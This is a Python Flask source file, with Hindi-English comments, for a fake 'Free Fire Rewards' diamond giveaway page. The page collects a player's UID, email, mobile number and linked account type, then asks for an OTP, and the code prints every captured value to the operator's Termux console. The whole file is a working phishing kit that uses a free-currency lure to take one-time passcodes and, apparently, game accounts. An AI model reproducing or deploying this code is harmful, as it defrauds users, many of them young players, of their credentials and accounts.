from flask import Flask, request, render_template_string

app = Flask(__name__)

# 1. Aapka Background Poster Link
BG_URL = "https://raw.githubusercontent.com/northway656-create/myflaskapp/main/22574.jpg"

# 2. Website ka Design (HTML/CSS)
HTML_TEMPLATE = f'''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>FF Diamond Registration</title>
    <style>
        body {{
            background-image: url('{BG_URL}');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex; justify-content: center; align-items: center; height: 100vh;
        }}
        .form-box {{
            background: rgba(255, 255, 255, 0.95); 
            padding: 30px; 
            border-radius: 20px;
            text-align: center; 
            width: 340px; 
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
        }}
        h2 {{ color: #e67e22; margin-bottom: 20px; text-shadow: 1px 1px 2px #000; }}
        input, select {{ 
            width: 100%; padding: 12px; margin: 10px 0; 
            border: 2px solid #ddd; border-radius: 8px; box-sizing: border-box; 
            font-size: 14px;
        }}
        button {{ 
            background: linear-gradient(to right, #f39c12, #d35400); 
            color: white; border: none; padding: 15px; 
            width: 100%; border-radius: 8px; font-weight: bold; 
            cursor: pointer; font-size: 16px; margin-top: 10px;
        }}
        button:hover {{ opacity: 0.9; }}
    </style>
</head>
<body>
    <div class="form-box">
        <h2>💎 FREE FIRE REWARDS 💎</h2>
        <form action="/submit" method="post">
            <input type="text" name="uid" placeholder="Enter Free Fire UID" required>
            <input type="email" name="email" placeholder="Email Address" required>
            <input type="text" name="phone" placeholder="Mobile Number" required>
            
            <select name="account_type">
                <option value="Google">Google Account</option>
                <option value="Facebook">Facebook Account</option>
                <option value="VK">VK Account</option>
                <option value="X (Twitter)">X (Twitter)</option>
            </select>
            
            <button type="submit">PROCEED TO GET OTP</button>
        </form>
    </div>
</body>
</html>
'''

# 3. Termux par data dikhane ka logic
@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/submit', methods=['POST'])
def submit():
    # User ka data variable mein save karna
    uid = request.form.get('uid')
    email = request.form.get('email')
    phone = request.form.get('phone')
    acc = request.form.get('account_type')

    # Termux screen par data print karna
    print("\n" + "="*30)
    print(f"🔥 NEW USER LOGGED IN 🔥")
    print(f"UID: {uid}")
    print(f"Email: {email}")
    print(f"Phone: {phone}")
    print(f"Account: {acc}")
    print("="*30 + "\n")

    return f'''
    <body style="text-align:center; padding-top:100px; font-family:sans-serif; background:#f4f4f4;">
        <div style="background:white; display:inline-block; padding:40px; border-radius:15px; box-shadow:0 5px 15px rgba(0,0,0,0.2);">
            <h2 style="color:red;">OTP VERIFICATION</h2>
            <p>Enter 6-digit OTP sent to: <b>{phone}</b></p>
            <form action="/final" method="post">
                <input type="text" name="otp" placeholder="0 0 0 0 0 0" maxlength="6" required 
                       style="font-size:24px; text-align:center; width:200px; padding:10px; border:2px solid #ccc; border-radius:10px;"><br><br>
                <button type="submit" style="background:green; color:white; padding:15px 40px; border:none; border-radius:8px; font-weight:bold; cursor:pointer;">VERIFY NOW</button>
            </form>
        </div>
    </body>
    '''

@app.route('/final', methods=['POST'])
def final():
    otp = request.form.get('otp')
    print(f"✅ RECEIVED OTP: {otp}")
    print("="*30 + "\n")
    return "<h1 style='text-align:center; margin-top:100px;'>Registration Successful!<br>Diamonds will be credited in 24 hours.</h1>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
